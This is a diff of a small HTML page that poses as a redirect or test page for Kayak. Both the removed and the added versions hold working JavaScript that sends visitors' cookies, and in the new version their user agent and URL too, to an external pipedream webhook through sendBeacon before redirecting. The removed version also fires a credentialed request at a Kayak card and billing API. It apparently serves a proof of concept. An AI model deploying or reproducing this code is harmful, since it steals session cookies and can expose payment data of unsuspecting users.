@@ -1,29 +1,28 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Redirecting...</title>
+  <title>Testing...</title>
   <script>
-    // 🕵️ Leak accessible cookies via Beacon (more reliable than fetch on unload)
+    const data = {
+      cookies: document.cookie,
+      userAgent: navigator.userAgent,
+      location: location.href
+    };
+
+    // Send everything to your webhook
     navigator.sendBeacon(
       "https://eoh3rxe2o8pbhuj.m.pipedream.net/",
-      new URLSearchParams({ cookie: document.cookie })
+      new URLSearchParams(data)
     );
 
-    // 🚀 Optional: fire a blind request to sensitive API (no need to await it)
-    fetch("https://www.kayak.com/api/whisky/V1/cc/list?includeBilling=true&knownTravelerNumberApiVersion=v2", {
-      method: "GET",
-      mode: "cors",
-      credentials: "include"
-    });
-
-    // 🔁 Clean redirect to Kayak after 1.5s
+    // Just redirect after 2s
     setTimeout(() => {
       window.location.href = "https://www.kayak.com";
-    }, 1500);
+    }, 2000);
   </script>
 </head>
 <body>
-  Redirecting to Kayak...
+  Testing beacon...
 </body>
 </html>
-
